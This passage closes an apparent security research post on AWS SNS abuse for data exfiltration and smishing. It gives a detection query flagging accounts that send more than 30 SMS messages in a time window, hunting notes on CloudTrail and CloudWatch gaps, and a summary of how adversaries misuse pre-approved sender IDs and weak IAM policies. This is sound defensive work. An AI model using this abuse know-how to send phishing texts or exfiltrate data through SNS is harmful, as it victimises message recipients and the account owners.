| DISSECT user_agent.original "%{user_agent_name} %{?user_agent_remainder}"
| STATS sms_message_count = COUNT(*) by target_time_window, cloud.account.id, aws.cloudtrail.user_identity.arn, cloud.region, source.address, user_agent_name
| WHERE sms_message_count > 30
```

Hunting Notes:

* AWS removes phone numbers in logs, so deeper analysis via CloudWatch logs may be necessary.  
* While investigating in CloudWatch, the message context is also sanitized. It would be ideal to investigate the message for any suspicious URL links being embedded in the text messages.  
* You can also review AWS SNS delivery logs (if enabled) for message metadata.  
* If messages are not using a topic-based subscription, it suggests direct targeting.  
* The source of these requests is important, if you notice them from an EC2 instance, that is rather odd or Lambda may be an expected serverless code.

# Takeaways

Thank you for taking the time to read this publication on **AWS SNS Abuse: Data Exfiltration and Phishing**. We hope this research provides valuable insights into how adversaries can leverage AWS SNS for data exfiltration, smishing and phishing campaigns, as well as practical detection and hunting strategies to counter these threats.

**Key Takeaways:**

* AWS SNS is a powerful service, but can be misused for malicious purposes, including phishing (smishing) and data exfiltration.  
* Adversaries may abuse production SNS permissions using pre-approved Sender IDs, Origination IDs, or long/short codes to send messages outside an organization.  
* Threat actors may weaponize misconfigurations in IAM policies, CloudTrail logging gaps and SNS API limitations to fly under the radar.  
* While in-the-wild (ItW) abuse of SNS is not frequently reported, we are confident that its weaponization and targeted exploitation are already occurring or will emerge eventually.  
* AWS CloudTrail does not capture phone numbers or messages in SNS logs, making CloudWatch third-party monitoring essential for deeper analysis  
* Threat hunting queries can help detect SNS topics being created, subscribed to, or receiving a spike in direct messages, signaling potential abuse.  
* Detection strategies include monitoring SNS API actions, identifying unusual SNS message spikes and flagging anomalies from EC2 or Lambda sources.  
* Defensive measures should include IAM policy hardening, CloudTrail & SNS logging, anomaly-based detections and security best practices as recommended by AWS to reduce attack surface.

AWS SNS is often overlooked in security discussions, but as this research shows, it presents a viable attack vector for adversaries if left unmonitored. We encourage defenders to stay proactive, refine detection logic, and implement robust security controls to mitigate these risks and increase security posture.

Thanks for reading and happy hunting\!

# References

* [https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/](https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/)  
* [https://permiso.io/blog/s/smishing-attack-on-aws-sms-new-phone-who-dis/](https://permiso.io/blog/s/smishing-attack-on-aws-sms-new-phone-who-dis/)  
* [https://catalog.workshops.aws/build-sms-program/en-US](https://catalog.workshops.aws/build-sms-program/en-US)